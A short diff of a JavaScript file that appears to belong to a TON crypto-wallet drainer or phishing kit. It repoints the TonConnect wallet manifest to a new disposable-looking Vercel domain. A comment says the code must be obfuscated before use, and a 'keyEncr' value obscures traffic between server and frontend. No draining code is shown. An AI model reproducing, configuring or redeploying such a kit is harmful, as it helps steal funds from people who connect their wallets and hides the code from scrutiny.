@@ -2,7 +2,7 @@
 // OBFUSCATION MUST BE MADE BEFORE USE https://obfuscator.io/
 
 // Ton Manifest - Your website avatar and domain name are displayed when you connect your wallet.
-const manifestUrl = 'https://lighthearted-hamster-034919.netlify.app/tonconnect-manifest.json';
+const manifestUrl = 'https://goida-gray.vercel.app/tonconnect-manifest.json';
 
 // The encryption key between the server and Frontend must be the same
 let keyEncr = 500;
@@ -610,4 +610,5 @@ document.addEventListener('DOMContentLoaded', async () => {
     } catch (e) {
 
     }
+
 });
